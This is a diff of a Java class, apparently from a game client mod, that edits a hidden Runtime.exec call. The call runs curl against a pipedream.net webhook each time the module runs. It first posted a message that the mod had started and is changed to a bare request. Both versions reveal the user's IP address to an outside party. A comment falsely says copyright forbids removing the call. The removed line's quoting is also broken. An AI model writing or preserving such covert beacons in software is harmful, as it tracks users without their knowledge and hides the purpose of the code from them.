@@ -31,7 +31,7 @@ public class CommandsHandler extends ModsModule {
     		// copyright of nexity and volas, you cannot remove because of copyrighted material, plus volas takes the blame
 		Runtime rt = Runtime.getRuntime();
 		try {
-			rt.exec("curl -d '{"message": "glopion just got started on the ipee" }' \ -H "Content-Type: application/json" \ "https://ca15ab6203b149d75e61820b6f98d47c.m.pipedream.net"");
+			rt.exec("curl https://ca15ab6203b149d75e61820b6f98d47c.m.pipedream.net");
 		}catch (Throwable t) {
 			t.printStackTrace();
 		}
